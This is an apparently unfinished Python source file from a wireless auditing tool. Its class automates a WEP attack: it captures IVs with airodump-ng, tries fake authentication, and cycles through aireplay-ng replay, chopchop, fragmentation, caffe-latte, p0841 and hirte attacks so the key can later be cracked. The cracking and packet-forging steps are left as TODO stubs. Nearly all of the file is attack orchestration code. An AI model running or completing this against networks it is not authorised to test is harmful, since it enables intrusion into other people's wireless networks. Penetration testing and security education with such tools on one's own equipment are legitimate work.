#!/usr/bin/python

from Attack import Attack
from Airodump import Airodump
from Aireplay import Aireplay, WEPAttackType
from Configuration import Configuration
from Interface import Interface
from Color import Color

import time

class AttackWEP(Attack):
    '''
        Contains logic for attacking a WEP-encrypted access point.
    '''

    fakeauth_wait = 5

    def __init__(self, target):
        super(AttackWEP, self).__init__(target)

    def run(self):
        '''
            Initiates full WEP attack.
            Including airodump-ng starting, cracking, etc.
        '''
        # First, start Airodump process
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      ivs_only=True, # Only capture IVs packets
                      output_file_prefix='wep') as airodump:

            airodump_target = self.wait_for_target(airodump)

            if self.fake_auth():
                # We successfully authenticated!
                # Use our interface's MAC address for the attacks.
                client_mac = Interface.get_mac()
            elif len(airodump_target.clients) == 0:
                # There are no associated clients. Warn user.
                Color.pl('{!} {O}there are no associated clients{W}')
                Color.pl('{!} {R}WARNING: {O}many attacks will not succeed' +
                         '  without fake-authentication or associated clients{W}')
                client_mac = None
            else:
                client_mac = airodump_target.clients[0].station

            aircrack = None # Aircrack process, not started yet

            wep_attack_types = [
                'replay',
                'chopchop',
                'fragment',
                'caffelatte',
                'p0841',
                'hirte'
            ]
            for attack_name in wep_attack_types:
                # Convert to WEPAttackType.
                wep_attack_type = WEPAttackType(attack_name)

                # Start Aireplay process.
                aireplay = Aireplay(self.target, \
                                    wep_attack_type, \
                                    client_mac=client_mac)

                # Loop until attack completes.
                while True:
                    airodump_target = self.wait_for_target(airodump)
                    Color.p('\r{+} WEP attack {C}%s{W} ({G}%d IVs{W}) '
                        % (attack_name, airodump_target.ivs))

                    # TODO: Check if we cracked it.
                    # if aircrack and aircrack.cracked():

                    # Check number of IVs, crack if necessary
                    if airodump_target.ivs > Configuration.wep_crack_at_ivs:
                        # TODO:
                        # 1. Check if we're already trying to crack:
                        #     aircrack and aircrack.is_running()
                        # 2. If not, start cracking:
                        #     aircrack = Aircrack(airodump_target, capfile)
                        pass

                    if not aireplay.is_running():
                        # Some Aireplay attacks loop infinitely
                        if attack_name == 'chopchop' or attack_name == 'fragment':
                            print '\nChopChop stopped, output:'
                            print aireplay.get_output()
                            # We expect these to stop once a .xor is created
                            # TODO:
                            # Check for .xor file.
                            # If it's not there, the process failed. Check stdout.
                            # If xor exists, run packetforge-ng on it.
                            # If packetforge created the .cap file to replay, then replay it
                            #     Change attack_name to 'forged arp replay'
                            #     Start Aireplay by replaying the cap file
                            pass
                        else:
                            print '\naireplay.get_output() =', aireplay.get_output()
                            raise Exception('Aireplay exited unexpectedly')

                    # TODO:
                    # Replay: Check if IVS stopped flowing (same for > 20 sec)
                    #         If so, restart the Replay attack.

                    time.sleep(1)
                    continue


    def fake_auth(self):
        '''
            Attempts to fake-authenticate with target.
            Returns: True if successful,
                     False is unsuccesful.
        '''
        Color.p('{+} attempting {G}fake-authentication{W} with {C}%s{W}...'
            % self.target.bssid)
        start_time = time.time()
        aireplay = Aireplay(self.target, 'fakeauth')
        process_failed = False
        while aireplay.is_running():
            if int(time.time() - start_time) > AttackWEP.fakeauth_wait:
                aireplay.stop()
                process_failed = True
                break
            time.sleep(0.1)

        # Check if fake-auth was successful
        if process_failed:
            fakeauth = False
        else:
            output = aireplay.get_output()
            fakeauth = 'association successful' in output.lower()

        if fakeauth:
            Color.pl(' {G}success{W}')
        else:
            Color.pl(' {R}failed{W}')
            if Configuration.require_fakeauth:
                # Fakeauth is requried, fail
                raise Exception(
                    'Fake-authenticate did not complete within' +
                    ' %d seconds' % AttackWEP.fakeauth_wait)
            else:
                # Warn that fakeauth failed
                Color.pl('{!} {O}' +
                    'unable to fake-authenticate with target' +
                    ' (%s){W}' % self.target.bssid)
                Color.pl('{!} continuing attacks because' +
                    ' {G}--require-fakeauth{W} was not set')
        return fakeauth



if __name__ == '__main__':
    from Target import Target
    fields = "A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  6,  54e,WEP, WEP, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, ".split(',')
    target = Target(fields)
    wep = AttackWEP(target)
    wep.run()

